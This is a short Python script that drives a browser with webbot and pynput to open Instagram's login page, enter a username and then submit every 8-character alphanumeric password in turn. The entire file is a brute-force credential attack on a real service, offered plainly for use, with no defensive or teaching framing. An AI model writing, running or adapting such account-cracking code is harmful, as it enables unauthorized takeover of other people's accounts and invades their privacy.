from webbot import Browser
from pynput.keyboard import Key, Controller
import time
web=Browser()
keyboard= Controller()
web.go_to('instagram.com')
time.sleep(5)
keyboard.press(Key.f6)
keyboard.release(Key.f6)
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type('')#username
keyboard.press(Key.tab)
keyboard.release(Key.tab)

word=["0","1","2","3","4","5","6","7","8","9",
        "a","b","c","d","e","f","g","h","i","j",
        "k","l","m","n","o","p","q","r","s","t",
        "u","v","w","x","y","z","A","B","C","D",
        "E","F","G","H","I","J","K","L","M","N",
        "O","P","Q","R","S","T","U","V","W","X",
        "Y","Z"]
w=["","","","","","","",""]
s=''
for a in word:
    w[0]=a
    for b in word:
        w[1]=b
        for c in word:
            w[2]=c
            for d in word:
                w[3]=d
                for e in word:
                    w[4]=e
                    for f in word:
                        w[5]=f
                        for g in word:
                            w[6]=g
                            for h in word:
                                w[7]=h
                                s=w[0]+w[1]+w[2]+w[3]+w[4]+w[5]+w[6]+w[7]
                                                                 
                                web.type(s, into='Password')
                                keyboard.press(Key.enter)
                                keyboard.release(Key.enter)